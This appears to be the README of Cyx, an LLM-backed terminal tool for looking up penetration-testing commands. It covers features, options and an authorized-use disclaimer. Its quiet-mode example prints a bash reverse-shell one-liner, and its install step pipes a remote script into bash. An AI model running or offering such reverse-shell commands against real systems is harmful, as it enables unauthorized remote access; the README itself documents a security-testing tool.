# Cyx

LLM-powered terminal tool for security command lookup. Supports Perplexity, Groq, and Ollama.

## Features

- Command-first output with code blocks
- Learn mode for detailed explanations
- Smart cache with ONNX semantic search
- Local LLM support via Ollama
- Source attribution and links

## Quick Start

```bash
# Install with one command
curl -sSL https://raw.githubusercontent.com/neur0map/cyx/master/scripts/install.sh | bash

# First time setup
cyx setup

# Use
cyx "nmap stealth scan"
cyx "sql injection bypass waf"
cyx --learn "linux privilege escalation"
```

## Documentation

- **[Installation Guide](docs/INSTALLATION.md)** - Detailed installation, troubleshooting, and setup
- **[Usage Guide](docs/USAGE.md)** - Examples, options, and advanced features
- **[Building from Source](docs/BUILDING.md)** - Build instructions and distribution
- **[Development Guide](docs/DEVELOPMENT.md)** - Contributing, testing, and releases
- **[Changelog](docs/CHANGELOG.md)** - Version history and release notes
- **[Data Normalization](docs/DATA_NORMALIZATION.md)** - Technical deep-dive into normalization data

## Usage

### Basic Commands

```bash
# Quick command lookup
cyx "reverse shell one liner"
cyx "hydra ssh brute force"

# Learn mode with detailed explanations
cyx --learn "metasploit meterpreter"
cyx -l "nmap service detection"
```

### CLI Options

```
-l, --learn          Educational mode with detailed breakdowns
-q, --quiet          Minimal output (response only, no formatting)
-v, --verbose        Detailed progress information
    --no-tty         Disable TTY features for scripting
```

### Configuration

```bash
cyx config show                           # View current config
cyx config set provider perplexity        # Change provider
cyx setup                                 # Re-run setup wizard
```

Config file: `~/.config/cyx/config.toml`

## Output Examples

### Normal Mode

```
╭─── RESPONSE ──────────────────────────────────────────────
│ ```bash
│ nmap -sS <target>
│ ```
│ TCP SYN stealth scan - doesn't complete handshake. Requires root.
╰──────────────────────────────────────────────────────────

[*] SOURCES
───────────────────────────────────────
Provider: Perplexity (sonar-pro)
Search: Yes (performed web search)

Links:
  - nmap documentation: https://nmap.org/book/synscan.html
  - TCP protocol (RFC 793): https://www.ietf.org/rfc/rfc793.txt
```

### Learn Mode

```bash
cyx --learn "nmap stealth scan"
```

Provides detailed explanations with flag breakdowns, protocol details, and alternatives.

### Quiet Mode

```bash
$ cyx -q "reverse shell bash"
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
```

## Technical Details

### Security

- API keys stored with 600 permissions in `~/.config/cyx/config.toml`
- Read-only operation - provides commands but never executes them
- Timeout protection - all API calls timeout after 120 seconds
- Local-first - all sensitive data remains on your machine

### System Prompts

Normal mode prioritizes executable commands with brief explanations. Learn mode provides detailed educational content with examples and alternatives.

## Troubleshooting

If you encounter library errors, run:

```bash
cyx setup
```

The setup wizard will automatically detect and fix ONNX Runtime library issues.

For detailed troubleshooting, see the [Installation Guide](docs/INSTALLATION.md).

## Disclaimer

**For authorized security testing, educational purposes, and defensive research only.**

This tool is designed for:
- Professional penetration testers with written authorization
- Security students in controlled lab environments
- Capture The Flag (CTF) competitions
- Defensive security and threat analysis

Always obtain explicit permission before testing systems you don't own.

## License

MIT License - See [LICENSE](LICENSE) for details.
